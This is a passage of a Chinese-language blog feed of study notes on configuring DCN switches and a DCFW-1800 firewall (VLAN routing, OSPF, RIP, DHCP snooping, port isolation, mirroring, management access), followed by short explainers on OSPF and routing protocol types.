class="code"><pre><span class="line">ip http server</span><br></pre></td></tr></table></figure><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成密钥</span></span><br><span class="line">ssh<span class="literal">-server</span> host<span class="literal">-key</span> create rsa modulus &lt;<span class="number">768</span><span class="literal">-2048</span>&gt;</span><br><span class="line"><span class="comment"># 开启服务</span></span><br><span class="line">ssh<span class="literal">-server</span> enable</span><br></pre></td></tr></table></figure><blockquote><p>神州交换机的ssh版本有点老, 自带的ssh客户端可能连不上, 需要加一些参数</p><p><a href="https://www.zhihu.com/column/p/30840210">ssh 登录旧设备的问题解决</a></p></blockquote><h2 id="SVI"><a href="#SVI" class="headerlink" title="SVI"></a>SVI</h2><blockquote><p>没有cisco的<code>no switchport</code>指令, 将接口加入vlan就行了</p></blockquote><p>目标: 让两台三层交换机下不同VLAN的PC互联</p><p>PC1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo route add -net 192.168.20.0 netmask 255.255.255.0 gw 192.168.10.1</span><br></pre></td></tr></table></figure><p>ip: 192.168.10.2</p><p>gw: 192.168.10.1</p><p>PC2:</p><p>ip: 192.168.20.2</p><p>gw: 192.168.20.1</p><p>S1:</p><p>vlan10: 192.168.10.1/24</p><p>vlan2: 192.168.2.1/24</p><p>S2:</p><p>vlan20: 192.168.20.1/24</p><p>vlan2: 192.168.2.2/24</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">S1(config)<span class="comment">#vlan 10</span></span><br><span class="line">S1(config<span class="literal">-vlan10</span>)<span class="comment">#vlan 2            </span></span><br><span class="line">S1(config<span class="literal">-vlan2</span>)<span class="comment">#switchport interface            </span></span><br><span class="line">S1(config<span class="literal">-vlan2</span>)<span class="comment">#switchport interface ethernet 1/0/3</span></span><br><span class="line">S1(config<span class="literal">-vlan2</span>)<span class="comment">#exit</span></span><br><span class="line">S1(config)<span class="comment">#interface vlan 2</span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-vlan2</span>)<span class="comment">#ip address 192.168.2.1 255.255.255.0</span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-vlan2</span>)<span class="comment">#exit                </span></span><br><span class="line">S1(config)<span class="comment">#interface vlan 10</span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-vlan10</span>)<span class="comment">#ip address 192.168.10.1 255.255.255.0</span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-vlan10</span>)<span class="comment">#exit</span></span><br><span class="line">S1(config)<span class="comment">#interface ethernet 1/0/1</span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#switchport mode access </span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#switchport access vlan 10</span></span><br><span class="line">S1(config)<span class="comment">#ip route 192.168.20.0 255.255.255.0 192.168.2.2</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">S2(config)<span class="comment">#vlan 20</span></span><br><span class="line">S2(config<span class="literal">-vlan20</span>)<span class="comment">#exit</span></span><br><span class="line">S2(config)<span class="comment">#interface vlan 20</span></span><br><span class="line">S2(config<span class="literal">-if</span><span class="literal">-vlan20</span>)<span class="comment">#ip address 192.168.20.1 255.255.255.0</span></span><br><span class="line">S2(config<span class="literal">-if</span><span class="literal">-vlan20</span>)<span class="comment">#exit</span></span><br><span class="line">S2(config)<span class="comment">#vlan 2</span></span><br><span class="line">S2(config<span class="literal">-vlan2</span>)<span class="comment">#exit</span></span><br><span class="line">S2(config)<span class="comment">#interface vlan 2</span></span><br><span class="line">S2(config<span class="literal">-if</span><span class="literal">-vlan2</span>)<span class="comment">#ip address 192.168.2.2 255.255.255.0</span></span><br><span class="line">S2(config<span class="literal">-if</span><span class="literal">-vlan2</span>)<span class="comment">#exit</span></span><br><span class="line">S2(config)<span class="comment">#ip route 192.168.10.0 255.255.255.0 192.168.2.1</span></span><br><span class="line">S2(config)<span class="comment">#interface ethernet 1/0/3</span></span><br><span class="line">S2(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">3</span>)<span class="comment">#switchport mode access           </span></span><br><span class="line">S2(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">3</span>)<span class="comment">#switchport access vlan 2</span></span><br></pre></td></tr></table></figure><h2 id="RIPv2"><a href="#RIPv2" class="headerlink" title="RIPv2"></a>RIPv2</h2><p>与思科 <a href="../Networking/Cisco/RIP.md">RIP.md</a> 基本一致</p><p><code>show ip route rip</code>显示RIP network的路由</p><p><code>show ip protocol</code>查看RIP详情</p><h2 id="OSPFv2"><a href="#OSPFv2" class="headerlink" title="OSPFv2"></a>OSPFv2</h2><blockquote><p>v2适用于IPv4, v3适用于IPv6</p></blockquote><ul><li><p>相同的域共享相同的LSDB</p></li><li><p>0代表主干域</p></li></ul><blockquote><p>OSPF的区域以Backbone（骨干区域）作为核心，该区域标识为0域，所有的其他区域都必须与0域在逻辑上相连，0域必须保证连续。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">S1(config)<span class="comment">#router ospf </span></span><br><span class="line">S1(config<span class="literal">-router</span>)<span class="comment">#network 192.168.10.0/24 area 0</span></span><br><span class="line">S1(config<span class="literal">-router</span>)<span class="comment">#network 192.168.2.0/24 area 0 </span></span><br><span class="line">S1(config<span class="literal">-router</span>)<span class="comment">#show ip ospf route </span></span><br><span class="line">O  <span class="number">192.168</span>.<span class="number">2.0</span>/<span class="number">24</span> [<span class="number">1</span>] is directly connected, Vlan2:<span class="number">192.168</span>.<span class="number">2.1</span>, Area <span class="number">0.0</span>.<span class="number">0.0</span>  tag:<span class="number">0</span></span><br><span class="line"></span><br><span class="line">O  <span class="number">192.168</span>.<span class="number">10.0</span>/<span class="number">24</span> [<span class="number">1</span>] is directly connected, Vlan10:<span class="number">192.168</span>.<span class="number">10.1</span>, Area <span class="number">0.0</span>.<span class="number">0.0</span>  tag:<span class="number">0</span></span><br><span class="line"></span><br><span class="line">S2(config)<span class="comment">#router ospf</span></span><br><span class="line">S2(config<span class="literal">-router</span>)<span class="comment">#network 192.168.2.0/24 area 0</span></span><br><span class="line">Apr <span class="number">16</span> <span class="number">20</span>:<span class="number">00</span>:<span class="number">56</span>:<span class="number">000</span> <span class="number">2021</span> S1 DEFAULT/<span class="number">7</span>/:[<span class="type">OSPF</span>]Neighbor [<span class="type">Vlan2</span>:<span class="number">192.168</span><span class="type">.2.1</span>-<span class="number">192.168</span><span class="type">.20.1</span>]: Status change Loading -&gt; Fulls</span><br><span class="line">S2(config<span class="literal">-router</span>)<span class="comment">#network 192.168.20.0/24 area 0</span></span><br><span class="line">S2(config<span class="literal">-router</span>)<span class="comment">#show ip route</span></span><br><span class="line">Codes: K - kernel, C - connected, S - <span class="keyword">static</span>, <span class="built_in">R</span> - RIP, B - BGP</span><br><span class="line">       O - OSPF, IA - OSPF inter area</span><br><span class="line">       N1 - OSPF NSSA external <span class="built_in">type</span> <span class="number">1</span>, N2 - OSPF NSSA external <span class="built_in">type</span> <span class="number">2</span></span><br><span class="line">       E1 - OSPF external <span class="built_in">type</span> <span class="number">1</span>, E2 - OSPF external <span class="built_in">type</span> <span class="number">2</span></span><br><span class="line">       i - IS<span class="operator">-IS</span>, L1 - IS<span class="operator">-IS</span> level<span class="literal">-1</span>, L2 - IS<span class="operator">-IS</span> level<span class="literal">-2</span>, ia - IS<span class="operator">-IS</span> inter area</span><br><span class="line">       * - candidate default</span><br><span class="line"></span><br><span class="line">C       <span class="number">127.0</span>.<span class="number">0.0</span>/<span class="number">8</span> is directly connected, Loopback  tag:<span class="number">0</span></span><br><span class="line">C       <span class="number">192.168</span>.<span class="number">2.0</span>/<span class="number">24</span> is directly connected, Vlan2  tag:<span class="number">0</span></span><br><span class="line">O       <span class="number">192.168</span>.<span class="number">10.0</span>/<span class="number">24</span> [<span class="number">110</span>/<span class="number">2</span>] via <span class="number">192.168</span>.<span class="number">2.1</span>, Vlan2, <span class="number">00</span>:<span class="number">00</span>:<span class="number">30</span>  tag:<span class="number">0</span></span><br><span class="line">C       <span class="number">192.168</span>.<span class="number">20.0</span>/<span class="number">24</span> is directly connected, Vlan20  tag:<span class="number">0</span></span><br><span class="line">Total routes are : <span class="number">4</span> item(s)</span><br></pre></td></tr></table></figure><h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置</span></span><br><span class="line">S1(config)<span class="comment">#ip dhcp pool &lt;pool_name&gt;</span></span><br><span class="line">S1(dhcp<span class="literal">-manu</span><span class="literal">-config</span>)<span class="comment">#network-address 192.168.10.1 24</span></span><br><span class="line"><span class="comment"># gw</span></span><br><span class="line">S1(dhcp<span class="literal">-manu</span><span class="literal">-config</span>)<span class="comment">#default-router 192.168.10.1</span></span><br><span class="line">S1(dhcp<span class="literal">-manu</span><span class="literal">-config</span>)<span class="comment">#exit</span></span><br><span class="line"><span class="comment"># 启用</span></span><br><span class="line">S1(config)<span class="comment">#service dhcp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中继(设置其他DHCP服务器)</span></span><br><span class="line"><span class="comment"># config启用转发DHCP报文</span></span><br><span class="line">ip forwark<span class="literal">-protocol</span> udp bootps</span><br><span class="line"><span class="comment"># 在接口设置转发地址</span></span><br><span class="line">interface vlan_id</span><br><span class="line">ip helper<span class="literal">-address</span> dhcp_server_ip</span><br></pre></td></tr></table></figure><blockquote><p>若设置多个pool时, 如不指定中继, 则会获得同一网段的pool的支持</p><p>DHCPv6需要在接口指定IP pool</p><p><code>ipv6 dhcp server &lt;poolname&gt; [preference&lt;value&gt;] [rapid-commit] [allow-hint]</code></p></blockquote><h2 id="DHCP侦听"><a href="#DHCP侦听" class="headerlink" title="DHCP侦听"></a>DHCP侦听</h2><p>作用是屏蔽接入网络中的非法的DHCP服务器。即开启 DHCP Snooping 功能后，网络中的客户端只有从管理员指定的DHCP服务器获取IP地址。 由于DHCP报文缺少认证机制，如果网络中存在非法DHCP服务器，管理员将无法保证客户端从管理员指定的DHCP服务器获取合法地址，客户机有可能从非法DHCP服务器获得错误的IP地址等配置信息，导致客户端无法正常使用网络。</p><ul><li>建议将连接<a href="https://zh.wikipedia.org/wiki/DHCP">DHCP</a>服务器的端口设置为信任端口，其他端口设置为非信任端口。</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">S1(config)<span class="comment">#ip dhcp snooping enable </span></span><br><span class="line"><span class="comment"># 记录非法信息</span></span><br><span class="line">S1(config)<span class="comment">#ip dhcp snooping blocked record enable</span></span><br><span class="line"><span class="comment"># 信任口</span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#ip dhcp snooping trust</span></span><br></pre></td></tr></table></figure><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S2(config)<span class="comment">#service password-encryption</span></span><br><span class="line">show run</span><br><span class="line">username test password <span class="number">7</span> <span class="number">098</span>f6bcd4621d373cade4e832627b4f6</span><br></pre></td></tr></table></figure><h2 id="RIPng"><a href="#RIPng" class="headerlink" title="RIPng"></a>RIPng</h2><blockquote><p>运行在IPv6的RIP协议</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">S1(config)<span class="comment">#router ipv6 rip </span></span><br><span class="line">S1(config<span class="literal">-router</span>)<span class="comment">#exit           </span></span><br><span class="line">S1(config)<span class="comment">#interface vlan 10</span></span><br><span class="line"></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-vlan10</span>)<span class="comment">#ipv6 address 2021:4:17:10::1/64</span></span><br><span class="line"><span class="comment"># 在该接口运行RIPng，类似IPv4的network</span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-vlan10</span>)<span class="comment">#ipv6 router rip</span></span><br><span class="line"></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-vlan10</span>)<span class="comment">#interface vlan 2</span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-vlan2</span>)<span class="comment">#ipv6 address 2021:4:17:2::1/64</span></span><br><span class="line">S1(config<span class="literal">-if</span><span class="literal">-vlan2</span>)<span class="comment">#ipv6 router rip</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="端口隔离"><a href="#端口隔离" class="headerlink" title="端口隔离"></a>端口隔离</h2><p>利用端口隔离的特性，可以实现vlan内部的端口隔离</p><p>配置端口隔离功能后，一个<strong>隔离组内的端口之间相互隔离</strong>, 不同隔离组和不属于隔离组的端口可以互相访问</p><p>一台交换机上最多能够配置16个隔离组</p><table><thead><tr><th>全局模式下</th><th>作用</th></tr></thead><tbody><tr><td><code>isolate-port group &lt;WORD&gt;</code></td><td>创建隔离组</td></tr><tr><td>`isolate-port group <WORD> switchport interface [ethernet</td><td>port-channel] <IFNAME>`</td></tr><tr><td><code>show isolate-port group [ &lt;WORD&gt; ]</code></td><td>显示端口隔离的相关配置</td></tr></tbody></table><h2 id="端口环路检测"><a href="#端口环路检测" class="headerlink" title="端口环路检测"></a>端口环路检测</h2><p>当交换机的端口接收到一个自己发送出去的报文时, 对其进行处理, 与STP有点类似</p><p>但与STP并不冲突, 端口环路检测针对一个端口, STP是全局</p><table><thead><tr><th>全局模式下</th><th>作用</th></tr></thead><tbody><tr><td><code>loopback-detection interval-time &lt;loopback&gt; &lt;no-loopback&gt;</code></td><td>设置环路检测的时间间隔</td></tr><tr><td><code>oopback-detection control-recovery timeout &lt;0-3600&gt;</code></td><td>配置环路检测受控方式是否自动恢复或者恢复的时间间隔</td></tr></tbody></table><table><thead><tr><th>端口模式下</th><th>作用</th></tr></thead><tbody><tr><td><code>loopback-detection specified-vlan &lt;vlan-list&gt;</code></td><td>开启端口环路检测</td></tr><tr><td>`loopback-detection control {shutdown</td><td>block}`</td></tr></tbody></table><h2 id="端口镜像"><a href="#端口镜像" class="headerlink" title="端口镜像"></a>端口镜像</h2><blockquote><p><strong>端口镜像功能</strong>是指交换机把某一个端口接收或发送的数据帧完全相同的复制给另一个端口；其中被复制的端口称为镜像源端口，复制的端口称为镜像目的端口</p><p><strong>流镜像功能</strong>是指交换机把<strong>端口的指定规则</strong>的接收的数据帧完全复制给一个端口，其中指定规则只有为<code>permit</code>时流镜像才能生效</p></blockquote><table><thead><tr><th>全局模式下</th><th>作用</th></tr></thead><tbody><tr><td>`monitor session <session> source {interface <interface-list>} {rx</td><td>tx</td></tr><tr><td><code>monitor session &lt;session&gt; destination interface &lt;interface-number&gt;</code></td><td>指定目标</td></tr><tr><td>`monitor session <session> source {interface <interface-list>} access-group <num> {rx</td><td>tx</td></tr></tbody></table><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">S3(config)<span class="comment">#monitor session 1 source interface ethernet1/0/1 ?</span></span><br><span class="line">  access<span class="literal">-list</span>  访问列表</span><br><span class="line">  both         管理发送和接收的流量</span><br><span class="line">  rx           只管理接收的流量</span><br><span class="line">  tx           只管理发送的流量</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> CS6200-28X-EI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>防火墙基础概念及配置</title>
      <link href="/Internet-equipment/DCN/DCFW-1800E-N3002/firewall.html"/>
      <url>/Internet-equipment/DCN/DCFW-1800E-N3002/firewall.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>  介绍了基础的系统架构, 全局使用UI进行配置</p><p>  webUI基于Version 5.0和5.5</p></blockquote><span id="more"></span><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口允许流量进出安全域。因此,为使流量能够流入和流出某个安全域,必须将接口绑定到该<br>安全域,并且,如果是三层安全域,还需要为接口配置 IP 地址。然后,必须配置相应的策略规则,<br>允许流量在不同安全域中的接口之间传输。多个接口可以被绑定到一个安全域,但是一个接口不能<br>被绑定到多个安全域。系统支持多种类型接口,实现不同功能。</p><blockquote><p><strong>虚拟接口也算一个接口</strong></p></blockquote><h2 id="安全域-ZONE"><a href="#安全域-ZONE" class="headerlink" title="安全域(ZONE)"></a>安全域(ZONE)</h2><p>安全域将网络划分为不同部分,例如 trust(通常为内网等可信任部分)、untrust(通常为因<br>特网等存在安全威胁的不可信任部分)等。将配置的策略规则应用到安全域上后,安全网关就能够<br>对出入安全域的流量进行管理和控制。系统提供 8 个预定义安全域, 分别是: trust、 untrust、 dmz、L2-trust、L2-untrust、L2-dmz、VPNHub 和 HA。</p><p>一个安全域只能绑定一个VS或VR</p><blockquote><p><strong>为接口设置安全域</strong></p></blockquote><h2 id="VSwitch-Virtual-Switch"><a href="#VSwitch-Virtual-Switch" class="headerlink" title="VSwitch(Virtual Switch)"></a>VSwitch(Virtual Switch)</h2><p>VSwitch 工作在二层, 将二层安全域绑定到 VSwitch 上后, 绑定到安全域的接口也被绑定到该 VSwitch 上。系统有一个默认的VSwitch, 名为 VSwitch1, 默认情况下, 二层安全域都会被绑定到 VSwtich1 中。</p><blockquote><p><strong>为安全域设置VSwitch</strong></p></blockquote><h2 id="VR-Virtual-Route"><a href="#VR-Virtual-Route" class="headerlink" title="VR(Virtual Route)"></a>VR(Virtual Route)</h2><p>VRouter 具有路由器功能,不同 VR 拥有各自独立的路由表。系统中有一个默认 VR, 名为 trust-vr, 默认情况下, 所有三层安全域都将会自动绑定到 trust-vr 上</p><h2 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h2><p>策略实现安全网关保证网络安全的功能。通过策略规则决定从一个安全域到另一个安全域的哪些流量该被允许,哪些流量该被拒绝。</p><h2 id="webUI配置"><a href="#webUI配置" class="headerlink" title="webUI配置"></a>webUI配置</h2><blockquote><p>安全网关的 ethernet0/0 接口配有默认 IP 地址 192.168.1.1/24,并且该接口的各种管理功<br>能均为开启状态</p><p>使用 <code>https://192.168.1.1</code></p><p>默认用户: admin</p><p>密码: admin</p></blockquote><h2 id="连接安全"><a href="#连接安全" class="headerlink" title="连接安全"></a>连接安全</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DCFW<span class="literal">-1800</span><span class="comment"># configure </span></span><br><span class="line"><span class="comment"># 允许来自0.0.0.0/0的登录类型, 0.0.0.0代表任意主机</span></span><br><span class="line">DCFW<span class="literal">-1800</span>(config)<span class="comment"># admin host 0.0.0.0/0 &lt;any|http|https|ssh|telnet&gt;</span></span><br></pre></td></tr></table></figure><h3 id="webUI界面"><a href="#webUI界面" class="headerlink" title="webUI界面"></a>webUI界面</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/dcfw-host.png" alt=""></p><p>5.0路径: 系统管理&gt;设备管理</p><h2 id="接口服务"><a href="#接口服务" class="headerlink" title="接口服务"></a>接口服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DCFW-1800(config)# interface ethernet0/0</span><br><span class="line">DCFW-1800(config-if-eth0/0)# man</span><br><span class="line">DCFW-1800(config-if-eth0/0)# manage ?</span><br><span class="line">  ip                Interface Internet Protocol config commands</span><br><span class="line">  ssh               Enable service SSH</span><br><span class="line">  telnet            Enable service telnet</span><br><span class="line">  ping              Enable service ping</span><br><span class="line">  snmp              Enable service SNMP</span><br><span class="line">  http              Enable service Web</span><br><span class="line">  https             Enable service SSL</span><br><span class="line">  ftp               Enable service ftp</span><br><span class="line">  traceroute        Enable service udp-tcp traceroute</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/dcfw.png" alt=""></p><h2 id="管理员"><a href="#管理员" class="headerlink" title="管理员"></a>管理员</h2><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/dcfw-user.png" alt=""></p><p>5.0路径: 系统管理&gt;设备管理</p>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> DCFW-1800E-N3002 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSPF简述</title>
      <link href="/Internet-equipment/Cisco/OSPF.html"/>
      <url>/Internet-equipment/Cisco/OSPF.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>摘要</p></blockquote><span id="more"></span><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li><p><strong>无类</strong> - OSPFv2 设计为无类方式；因此，它可支持 IPv4 VLSM 和 CIDR。</p></li><li><p><strong>高效</strong> - 路由变化会触发路由更新（非定期更新）。它使用 SPF 算法选择最优路径。</p></li><li><p><strong>快速收敛</strong> - 它能迅速地传播网络变化。</p></li><li><p><strong>可扩展</strong> - 在小型和大型网络中都能够良好运行。路由器可以分为多个区域，以支持分层结构。</p></li><li><p><strong>安全</strong> - OSPFv2 支持消息摘要 5 (MD5) 和安全散列算法 (SHA) 身份验证。OSPFv3 使用互联网协议安全性 (IPsec) 添加 OSPFv3 数据包的身份验证。启用身份验证时，OSPF 路由器只接受来自对等设备中具有相同预共享密钥的加密路由更新。</p></li></ul><blockquote><p>OSPF的AD为110</p></blockquote><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a><strong>数据结构</strong></h3><p>OSPF 创建和维护三种数据库：</p><ul><li><p><strong>邻接数据库</strong> - 创建邻居表</p></li><li><p><strong>链路状态数据库 (LSDB)</strong> - 创建拓扑表</p></li><li><p><strong>转发数据库</strong> - 创建路由表</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/OSPF.png" alt=""></p><p>这些表包含用于交换路由信息的邻接路由器列表，在 RAM 中保存和维护。</p><h3 id="路由协议消息"><a href="#路由协议消息" class="headerlink" title="路由协议消息"></a><strong>路由协议消息</strong></h3><p>第 3 层设备（例如路由器）运行 OSPF 交换消息，使用 5 种类型的数据包传输路由信息。</p><ol><li><p>Hello 数据包</p></li><li><p>数据库描述数据包</p></li><li><p>链路状态请求数据包</p></li><li><p>链路状态更新数据包</p></li><li><p>链路状态确认数据包</p></li></ol><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a><strong>算法</strong></h3><p>路由器使用根据 Dijkstra SPF 算法得出的计算结果创建拓扑表。</p><p>SPF 算法基于到达目的地的累计开销。 </p>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>路由协议</title>
      <link href="/Internet-equipment/Cisco/Route.html"/>
      <url>/Internet-equipment/Cisco/Route.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>摘要</p></blockquote><span id="more"></span><h2 id="IGP-和-EGP-路由协议"><a href="#IGP-和-EGP-路由协议" class="headerlink" title="IGP 和 EGP 路由协议"></a>IGP 和 EGP 路由协议</h2><ul><li><p>自治系统 (AS) 是接受统一管理（比如公司或组织）的路由器集合。</p></li><li><p><strong>内部网关协议 (IGP)</strong> - 用于在 AS 中实现路由。它也称为 AS 内路由。IGP 包括 RIP、EIGRP、OSPF 和 IS-IS。</p></li><li><p><strong>外部网关协议 (EGP)</strong> - 用于在 AS 间实现路由。它也称为 AS 间路由。边界网关协议 (BGP) 是目前唯一可行的 EGP，也是互联网使用的官方路由协议。</p></li></ul><h2 id="距离矢量路由协议"><a href="#距离矢量路由协议" class="headerlink" title="距离矢量路由协议"></a>距离矢量路由协议</h2><p>距离矢量意味着通过提供两个特征通告路由：</p><ul><li><p><strong>距离</strong> - 根据度量（如跳数、开销、带宽、延迟等）确定与目的网络的距离。</p></li><li><p><strong>矢量</strong> - 指定下一跳路由器或送出接口的方向以达到目的地。</p></li></ul><p>有四个距离矢量 IPv4 IGP：</p><ul><li><p><strong>RIPv1</strong> - 第一代传统协议</p></li><li><p><strong>RIPv2</strong> - 简单距离矢量路由协议</p></li><li><p><strong>IGRP</strong> - 第一代思科专有协议（已过时并由 EIGRP 取代）</p></li><li><p><strong>EIGRP</strong> - 距离矢量路由高级版 </p></li></ul><h2 id="链路状态路由协议"><a href="#链路状态路由协议" class="headerlink" title="链路状态路由协议"></a>链路状态路由协议</h2><blockquote><p>与距离矢量路由协议的运行过程不同，配置了链路状态路由协议的路由器可以获取所有其他路由器的信息来创建网络的完整视图（即拓扑结构）。</p></blockquote><p>有两个链路状态 IPv4 IGP：</p><ul><li><p><strong>OSPF</strong> - 常用的基于标准的路由协议</p></li><li><p><strong>IS-IS</strong> - 常见于提供商网络</p></li></ul><h2 id="有类路由协议"><a href="#有类路由协议" class="headerlink" title="有类路由协议"></a>有类路由协议</h2><blockquote><p>有类路由协议和无类路由协议之间的最大区别是有类路由协议不会在路由更新中发送子网掩码信息。而无类路由协议在路由更新中包含子网掩码信息。</p><p>所开发的两个原始 IPv4 路由协议是 RIPv1 和 IGRP</p></blockquote><h2 id="无类路由协议"><a href="#无类路由协议" class="headerlink" title="无类路由协议"></a>无类路由协议</h2><blockquote><p>现代网络不再使用有类 IP 编址，因此子网掩码不能由第一个二进制八位数的值来确定。无类 IPv4 路由协议（RIPv2、EIGRP、OSPF 和 IS-IS）在路由更新中都包括网络地址的子网掩码信息。无类路由协议支持 VLSM 和 CIDR。</p><p>IPv6 路由协议是无类的。有类或无类的区别仅适用于 IPv4 路由协议。</p></blockquote><h2 id="路由协议特征"><a href="#路由协议特征" class="headerlink" title="路由协议特征"></a>路由协议特征</h2><p><strong>收敛速度</strong> - 收敛速度是指网络拓扑结构中的路由器共享路由信息并使各台路由器掌握的网络情况达到一致所需的时间</p><p><strong>可扩展性</strong> - 可扩展性表示根据一个网络所部署的路由协议，该网络能达到的规模</p><p><strong>有类还是无类（使用 VLSM）</strong> - 有类路由协议不包含子网掩码，也不支持 VLS</p><p><strong>资源使用率</strong> - 资源使用率包括路由协议的要求，如：内存空间 (RAM)、CPU 利用率和链路带宽利用率</p><p><strong>实现和维护</strong> - 实现和维护体现了对于所部署的路由协议，网络管理员实现和维护网络时必须要具备的知识级别。</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/route-protocol.png" alt=""></p><h2 id="路由协议度量"><a href="#路由协议度量" class="headerlink" 